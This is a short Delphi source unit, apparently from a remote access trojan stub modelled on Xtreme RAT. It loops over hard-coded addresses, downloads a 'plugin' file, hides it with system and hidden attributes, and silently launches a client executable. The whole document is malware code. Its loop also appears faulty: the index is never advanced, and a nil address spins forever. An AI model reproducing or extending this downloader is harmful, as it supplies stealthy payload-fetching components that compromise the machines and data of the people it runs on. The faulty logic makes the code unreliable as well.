unit UnitDownload; //don't need to tell how it's great to have small stub size! idea from Xtreme RAT 3.6 source code

interface

uses
  Windows, UnitFunctions;

var
  Downloaded: Boolean;
  xClientPath, PluginPath: PChar;
  Address: array[0..4] of TArray;

function MyDownloadPlugin(p: Pointer): DWORD; stdcall;

implementation

function MyDownloadFile(Url: PChar): Boolean;
begin
  Result := DownloadToFile(Url, PluginPath);
  if Result = True then
  begin
    SetFileAttributes(PluginPath, FILE_ATTRIBUTE_ARCHIVE or FILE_ATTRIBUTE_READONLY or
      FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM);
    ShellExecute(0, 'open', xClientPath, nil, nil, 0);
    ExitProcess(0);
  end;
end;

function MyDownloadPlugin(p: Pointer): DWORD; stdcall;
var
  Url: PChar;
  i: Integer;
begin
  i := 0;
  Downloaded := False;

  while True do
  begin
    Url := Address[i];
    if Url = nil then Continue;
    Downloaded := MyDownloadFile(Url);
    if Downloaded = True then Break;

    if i > 4 then i := 0;
    Sleep(1000);
  end;
end;

end.


